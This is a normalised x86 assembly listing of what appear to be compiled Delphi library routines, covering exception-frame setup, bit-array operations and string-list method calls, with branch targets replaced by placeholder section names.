inc eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413c7f
mov eax [ ebp - 0x4 ]
call sub_413ce8
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x2
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
mov ecx ebx
call sub_4138a4
sub_413c98
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_413c84
xor eax eax
push ebp
push sub_413cdb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_413a5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413ce2
mov eax [ ebp - 0x4 ]
call sub_413ce8
retn
sub_413cf4
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_413d48
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403214
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_413d48
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x4 ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test esi esi
jge r-xdata
lea eax [ esi + 0x20 ]
dec eax
test eax eax
jns r-xdata
mov eax ebx
call sub_413d24
sar eax 0x5
mov edi eax
shl edi 0x2
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
add eax 0x1f
sar eax 0x5
mov ebp eax
shl ebp 0x2
cmp ebp edi
je r-xdata
add eax 0x1f
mov [ ebx + 0x4 ] esi
xor eax eax
mov [ esp ] eax
test edi edi
je r-xdata
test ebp ebp
je r-xdata
mov eax edi
call sub_4026bc
mov [ esp ] eax
mov eax [ esp ]
xor ecx ecx
mov edx edi
call sub_402c40
mov eax [ esp ]
mov [ ebx + 0x8 ] eax
cmp [ esp ] 0x0
je r-xdata
mov edx ebp
mov eax [ ebx + 0x8 ]
call sub_4026dc
mov edx edi
mov eax ebp
call sub_413d3c
mov ecx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_4028b8
sub_413dec
cmp edx [ eax + 0x4 ]
jae r-xdata
cmp edx 0x0
jl sub_413d24
mov eax [ eax + 0x8 ]
or cl cl
je r-xdata
push eax
push edx
push ecx
inc edx
call sub_413d48
pop ecx
pop edx
pop eax
jmp r-xdata
btr [ eax ] edx
retn
bts [ eax ] edx
retn
sub_413e18
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax [ ebx + 0x4 ]
add eax 0x20
dec eax
test eax eax
jns r-xdata
sar eax 0x5
dec eax
test eax eax
jl r-xdata
add eax 0x1f
mov eax [ ebx + 0x4 ]
inc eax
mov [ esp ] eax
xor esi esi
inc esi
dec [ esp ]
jne r-xdata
mov eax [ ebx + 0x8 ]
mov edi [ eax + esi * 4 ]
xor eax eax
mov eax [ ebx + 0x8 ]
mov edx [ r-xdata ]
cmp edx [ eax + esi * 4 ]
je r-xdata
jb r-xdata
and edx 0x7f
bt edi edx
inc eax
cmp al 0x20
jne r-xdata
mov edx esi
shl edx 0x5
and eax 0x7f
add edx eax
mov eax edx
mov edx [ ebx + 0x4 ]
cmp eax edx
jl r-xdata
mov edx eax
cmp dl 0x1f
ja r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax edx
jmp r-xdata
sub_413e90
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
mov eax esi
call sub_4166c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403214
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_413ed0
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_413f86
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403ff4
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_403174
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4041c0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_403174
lea eax [ ebp - 0x104 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0x4
lea eax [ ebp - 0x114 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4e8
call sub_403998
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413f8d
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_413fac
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_414041
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax [ ebx ]
call sub_403174
lea edx [ ebp - 0x104 ]
mov eax edi
call sub_4041c0
mov eax ebx
mov si 0xffff
call sub_403420
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414048
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
mov eax ebx
mov si 0xffff
call sub_403420
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403420
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push r-xdata
push [ edi ]
mov eax edi
mov edx 0x3
call sub_4042dc
sub_414053
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx ] dh
rol bl 0x90
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_403460
mov eax ebx
mov si 0xffff
call sub_403420
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffff
call sub_403420
push eax
lea eax [ ebx + 0x4 ]
call sub_405598
mov ecx eax
mov edx r-xdata
pop eax
call sub_4032d8
sub_41409e
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
jmp r-xdata
pop ebp
retn 0x4
sub_4140d0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
or eax 0xffffffff
mov eax [ eax + 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
jmp r-xdata
pop ebp
retn 0x4
sub_4140f0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4032d8
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_414118
push ebx
push ecx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ ebx + 0x4 ]
call [ eax + 0x1c ]
mov [ esp ] eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ esp ]
pop edx
pop ebx
retn
sub_414138
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_414192
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jg r-xdata
mov eax ebx
call sub_413a00
call sub_403224
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
sub_4141a0
push ebx
push esi
call sub_403598
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_414d84
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413e90
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403580
sub_4141d0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4141f4
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov esi eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_414218
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4142bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414368
xor eax eax
push ebp
push sub_4142a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4142a9
mov eax [ ebp - 0x4 ]
call sub_414424
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
pop edx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_4142d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_413ebc
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_414368
xor eax eax
push ebp
push sub_414350
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov esi ebx
mov al [ esi + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] al
mov al [ esi + 0x7 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x7 ] al
mov al [ esi + 0x6 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x6 ] al
mov al [ esi + 0x5 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_414424
retn
sub_414380
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x20 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg bl
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_414438
mov ebx eax
xor bl 0x1
jmp r-xdata
sub_4143d8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_414c1c
mov eax [ ebp - 0x8 ]
push eax
push sub_414f78
push ebp
call sub_414380
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_414438
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4144cd
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4144d4
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403f80
retn
mov esi ebx
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x9 ] 0x1
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x14 ]
pop eax
call sub_404368
jne r-xdata
sub_4144e4
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
call sub_4144e0
push eax
mov [ esp + 0x4 ] esi
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b42c
jmp sub_403998
sub_41451c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414564
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405a5c
mov edx [ ebp - 0x4 ]
mov ecx edi
mov eax ebx
call sub_4144e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41456b
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_414574
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41464c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414368
xor eax eax
push ebp
push sub_41462a
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414631
mov eax [ ebp - 0x4 ]
call sub_414424
retn
sub_414668
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4146ad
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_40441c
call sub_4086b4
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4146b4
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_4146bc
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4147c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
xor ebx ebx
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_403ff4
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
mov ecx ebx
xor edx edx
call sub_40404c
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov esi [ ebp - 0x10 ]
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0xc ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4147ce
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403f80
retn
inc esi
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x20 ]
call sub_40421c
mov edi eax
mov eax [ ebp - 0x1c ]
call sub_40421c
add edi eax
add ebx edi
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_40421c
mov ebx eax
test ebx ebx
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx ebx
call sub_4028b8
add [ ebp - 0x14 ] ebx
inc [ ebp - 0xc ]
dec esi
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
mov ecx ebx
call sub_4028b8
add [ ebp - 0x14 ] ebx
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x18 ]
call sub_40421c
mov ebx eax
test ebx ebx
je r-xdata
sub_4147e4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_414863
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov esi eax
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
call sub_403f5c
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40421c
mov edx eax
add edx 0x2
mov ecx 0x7fffffff
pop eax
call sub_40447c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41486a
lea eax [ ebp - 0xc ]
call sub_403f5c
retn
sub_414870
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4148e8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc esi
mov [ ebp - 0x8 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4148ef
lea eax [ ebp - 0xc ]
call sub_403f5c
retn
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
test eax eax
je r-xdata
sub_4148fc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4149bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov [ ebp - 0x8 ] 0xffffffff
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_40447c
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x34 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xc ]
mov eax ebx
call sub_415008
mov edx eax
lea eax [ ebp - 0x14 ]
call sub_404144
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_40c054
mov esi eax
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4149c6
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403f80
lea eax [ ebp - 0xc ]
call sub_403f5c
retn
sub_4149d0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp ebp eax
je r-xdata
sub_414a04
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_414a34
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_415b44
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414a7c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x6c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414a83
mov eax [ ebp - 0x4 ]
call sub_403224
retn
sub_414a88
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414b25
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_414368
xor eax eax
push ebp
push sub_414b08
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov esi eax
mov eax ebx
call sub_415690
sub esi eax
lea eax [ ebp - 0x8 ]
mov ecx esi
xor edx edx
call sub_40404c
mov edx [ ebp - 0x8 ]
mov ecx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414b0f
mov eax [ ebp - 0x4 ]
call sub_414424
retn
sub_414b34
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414bd5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414bdc
lea eax [ ebp - 0x8 ]
call sub_403f5c
retn
mov eax [ ebp - 0x4 ]
call sub_414368
xor eax eax
push ebp
push sub_414bb8
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
push edi
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_414424
retn
sub_414be4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebp eax
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push ebp
mov ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_414c1c
push ebp
mov ebp esp
add esp 0xfffffff4
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414cc0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_417880
mov eax [ ebp - 0x4 ]
call sub_414368
xor eax eax
push ebp
push sub_414c9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x44 ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_41691c
test al al
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_418520
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414ca2
mov eax [ ebp - 0x4 ]
call sub_414424
retn
sub_414ccc
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_415b44
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_414d17
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414d1e
mov eax [ ebp - 0x4 ]
call sub_403224
retn
sub_414d24
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414d71
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_40421c
mov ecx eax
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4158f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414d78
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_414d84
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx esi
call sub_4055b0
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
mov edx [ eax ]
